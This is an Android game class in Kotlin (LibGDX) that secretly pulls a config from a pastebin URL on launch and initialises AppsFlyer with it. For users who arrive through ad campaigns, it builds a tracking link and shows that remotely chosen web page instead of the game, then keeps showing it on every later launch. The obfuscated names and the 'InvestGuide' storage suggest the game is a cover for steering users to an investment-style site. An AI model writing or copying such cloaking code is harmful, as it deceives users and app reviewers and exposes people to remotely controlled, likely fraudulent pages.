package com.ingiodin.strinvestida.game

import android.content.SharedPreferences
import androidx.appcompat.app.AppCompatActivity.MODE_PRIVATE
import com.appsflyer.AppsFlyerConversionListener
import com.appsflyer.AppsFlyerLib
import com.appsflyer.attribution.AppsFlyerRequestListener
import com.badlogic.gdx.assets.AssetManager
import com.badlogic.gdx.utils.Disposable
import com.badlogic.gdx.utils.ScreenUtils
import com.ingiodin.strinvestida.GameActivity
import com.ingiodin.strinvestida.appContext
import com.ingiodin.strinvestida.game.manager.MusicManager
import com.ingiodin.strinvestida.game.manager.NavigationManager
import com.ingiodin.strinvestida.game.manager.SoundManager
import com.ingiodin.strinvestida.game.manager.SpriteManager
import com.ingiodin.strinvestida.game.manager.util.MusicUtil
import com.ingiodin.strinvestida.game.manager.util.SoundUtil
import com.ingiodin.strinvestida.game.manager.util.SpriteUtil
import com.ingiodin.strinvestida.game.screens.LoaderScreen
import com.ingiodin.strinvestida.game.utils.GColor
import com.ingiodin.strinvestida.game.utils.advanced.AdvancedGame
import com.ingiodin.strinvestida.game.utils.disposeAll
import com.ingiodin.strinvestida.util.log
import kotlinx.coroutines.*
import org.json.JSONObject
import java.io.BufferedReader
import java.io.InputStreamReader
import java.net.HttpURLConnection
import java.net.URL
import java.util.concurrent.atomic.AtomicBoolean

var GLOBAL_isGame = false
    private set

class LibGDXGame(val activity: GameActivity) : AdvancedGame() {

    lateinit var assetManager     : AssetManager      private set
    lateinit var navigationManager: NavigationManager private set
    lateinit var spriteManager    : SpriteManager     private set
    lateinit var musicManager     : MusicManager      private set
    lateinit var soundManager     : SoundManager      private set

    val loader by lazy { SpriteUtil.Loader() }
    val all    by lazy { SpriteUtil.All() }

    val musicUtil by lazy { MusicUtil() }
    val soundUtil by lazy { SoundUtil() }

    var backgroundColor = GColor.text
    val disposableSet   = mutableSetOf<Disposable>()

    val coroutine = CoroutineScope(Dispatchers.Default)

    override fun create() {
        navigationManager = NavigationManager(this)
        assetManager      = AssetManager()
        spriteManager     = SpriteManager(assetManager)

        musicManager      = MusicManager(assetManager)
        soundManager      = SoundManager(assetManager)

        navigationManager.navigate(LoaderScreen::class.java.name)

        investrun()
    }

    val sharedPreferences: SharedPreferences = activity.getSharedPreferences("InvestGuide", MODE_PRIVATE)

    override fun render() {
        ScreenUtils.clear(backgroundColor)
        super.render()
    }

    override fun dispose() {
        try {
            log("dispose LibGDXGame")
            coroutine.cancel()
            disposableSet.disposeAll()
            disposeAll(assetManager, musicUtil)
            super.dispose()
        } catch (e: Exception) { log("exception: ${e.message}") }
    }

    // Logic Web ---------------------------------------------------------------------------

    private fun investrun() {
        log("investrun")
        activity.blockRedirect = { GLOBAL_isGame = true }
        activity.initWeb()

        val demo = sharedPreferences.getString("investrun", "aaaDEMO") ?: "aaaDEMO"

        try {
            if (demo == "aaaDEMO") {
                coroutine.launch(Dispatchers.Main) {
                    val jeison = withContext(Dispatchers.IO) { requestGet() }

                    if (jeison != null) {
                        AppsFlyerLib.getInstance().init(jeison.jungel, getAppsFlyerConversionListener(jeison.invertus), appContext)
                        AppsFlyerLib.getInstance().start(activity, jeison.jungel, getAppsFlyerRequestListener())
                    } else {
                        GLOBAL_isGame = true
                    }
                }
            } else {
                activity.showUrl(demo)
            }
        } catch (e: Exception) {
            log("error: ${e.message}")
            GLOBAL_isGame = true
        }
    }

    private suspend fun requestGet() = CompletableDeferred<InvestG_JSON?>().also { continuation ->
        val urlString = "https://pastebin.com/raw/QVeQ3q5f"

        try {
            val url        = URL(urlString)
            val connection = url.openConnection() as HttpURLConnection

            connection.requestMethod           = "GET"
            connection.connectTimeout          = 5000
            connection.readTimeout             = 5000
            connection.instanceFollowRedirects = true

            val responseCode = connection.responseCode

            if (responseCode == HttpURLConnection.HTTP_OK) {
                val reader = BufferedReader(InputStreamReader(connection.inputStream))
                val response = StringBuilder()
                var line: String?

                while (reader.readLine().also { line = it } != null) {
                    response.append(line)
                }
                reader.close()

                val jsonResponse = JSONObject(response.toString())
                log("json = $jsonResponse")

                val getJSON = InvestG_JSON(
                    invertus = jsonResponse.getString("invertus") ?: "",
                    jungel   = jsonResponse.getString("jungel")   ?: "",
                )
                continuation.complete(getJSON)

            } else {
                log("Запит не успішний. Код відповіді: $responseCode")
                continuation.complete(null)
            }
            connection.disconnect()
        } catch (e: Exception) {
            log("Error: ${e.message}")
            e.printStackTrace()
            continuation.complete(null)
        }
    }.await()

    private data class InvestG_JSON(val invertus: String, val jungel: String)

    private fun getAppsFlyerConversionListener(all: String) = object : AppsFlyerConversionListener {
        private val isAppsflyerGetData = AtomicBoolean(false)

        override fun onConversionDataSuccess(appfMap: MutableMap<String, Any>?) {
            if (isAppsflyerGetData.getAndSet(true)) return

            if (appfMap != null) {
                val campaign = appfMap["campaign"] as? String
                val afAd     = appfMap["af_ad"]    as? String
                val media    = appfMap["media_source"] as? String

                log("Result: campaign = $campaign | afAd = $afAd | media_source = $media | appfMap = $appfMap")

                val link = "$all?lorepit=$campaign&vuskrem=$afAd&dacolin=$media"
                log("link = $link")

                coroutine.launch(Dispatchers.IO) { sharedPreferences.edit().putString("investrun", link).apply() }
                activity.showUrl(link)

            } else GLOBAL_isGame = true
        }

        override fun onConversionDataFail(p0: String?) {
            if (isAppsflyerGetData.getAndSet(true)) return
            GLOBAL_isGame = true
        }

        override fun onAppOpenAttribution(p0: MutableMap<String, String>?) {}
        override fun onAttributionFailure(p0: String?) {}
    }

    private fun getAppsFlyerRequestListener() = object : AppsFlyerRequestListener {
        override fun onSuccess() {
            log("AppsFlyer: onSuccess")
        }

        override fun onError(p0: Int, p1: String) {
            log("AppsFlyer: onError")
        }
    }

}